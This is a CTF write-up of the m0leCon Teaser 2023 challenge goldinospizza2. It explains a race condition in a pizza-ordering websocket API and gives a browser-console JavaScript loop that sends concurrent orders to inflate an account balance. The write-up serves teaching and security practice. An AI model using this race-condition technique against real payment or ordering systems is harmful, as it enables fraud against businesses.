---
layout: post
title: m0leCon Teaser 2023 Writeup
tags: [ctf, ctf writeup]
---

[m0leCon Teaser 2023](https://ctf.m0lecon.it/)  
[On CTFtime](https://ctftime.org/event/1898)

Overall good CTF with challenging original fun challenges.

On this page:

- [goldinospizza2](#goldinospizza2) - Web, websocket API, exploit race condition

## goldinospizza2

The challenge was released at about 2:40 AM BST as the "[~~patched~~ *improved* version of `goldinospizza`](https://discord.com/channels/1100159162794655904/1100159163096633447/1106757967291879506)", which was about over 8 hours into the CTF. It was just before I was planning to go to bed, but the challenge looked solvable😅.

The challenge was a web challenge with a website that allowed you to order pizza with a registered account. Most of the pizzas' prices were ranging between 6 and 15, but there was one pizza named "The flagship of pizzas" that costs 1,000,000. The flag will be shown if this pizza is successfully ordered. The initial account balance is 30.

Looking through the code, there are two websocket API functions that are interesting, one is `order`, and another one is `cancel`. The `order` function is used to order a pizza, and the `cancel` function is used to cancel an order and get refund.

The `order` function is implemented as follows:

```python
def order(data, ws, n):
    # Some checks on input omitted
    for item in data["orders"]:
        # Some checks on input omitted
        if type(item["quantity"]) is not int:
            db.session.rollback()
            raise AssertionError("ONE OF YOUR 🍕 'quantity' IS NOT INT")
        if item["quantity"] <= 0:
            db.session.rollback()
            raise AssertionError("ONE OF YOUR 🍕 'quantity' IS NOT VALID")
        product = db.session.execute(db.select(Product).filter(
            Product.id == item["product"])).scalars().one_or_none()
        if product is None:
            db.session.rollback()
            raise AssertionError("WE DON'T SELL THAT 🍕")
        quantity = item["quantity"]
        current_user.balance -= product.price * quantity
        if current_user.balance < 0:
            db.session.rollback()
            raise AssertionError("NO 🍕 STEALING ALLOWED!")
        db.session.add(Order(
            user_id=current_user.id,
            product_id=product.id,
            product_quantity=quantity,
            product_price=product.price
        ))
        if product.id == 0 and quantity > 0:
            ws.send(
                f"WOW you are SO rich! Here's a little extra with your golden special 🍕: {os.environ['FLAG']}")
    db.session.add(current_user)
    db.session.commit()
    return len(data["orders"]), {"ok": True, "balance": current_user.balance, "orders": _orders()}
```

In the code, I identified that there is a race condition that can be exploited to make total order larger than we have in the balance, and cancel the order to refund so we can have more balanced than we started with.

We can blast with multiple websocket requests to make order, and if the previous order has not been committed to the database, the next request is still checked against the old balance.

To make programming easier, I did scripting within the browser console within the context of the website. After some initial test, my balance increased to 66.00 from the initial 30.00.

![Balance increased to 66.00](/assets/image/m0lecon-teaser-2023-writeup/pizza-balance.png)

The script I used to blast the order is as follows:

```javascript
let message = {
    "request": "order",
    "orders": [{
        "product": 19,
        "quantity": 9792,
    }, ],
}
for (let i = 1; i < 20; i++) {
    const ws = new WebSocket(`wss://goldinospizza2.challs.m0lecon.it/sock`);
    ws.addEventListener("open", (event) => {
        ws.send(JSON.stringify(message))
    })
}
```

The connection will get killed after some numbers of requests. To scale this up, when I repeated the process, I increased the quantity of each of the order to the amount that I can afford with the balance. Then my available balance increased increases exponentially.

With enough balance, order the golden "The flagship of pizzas", get the flag and submitted at 4:00 AM BST. Enjoy the 🍕:

```
ptm{https://youtu.be/Uzryuem5NDc lets make pizza greater than zero again https://www.giallozafferano.com/recipes/Pizza-Margherita.html}
```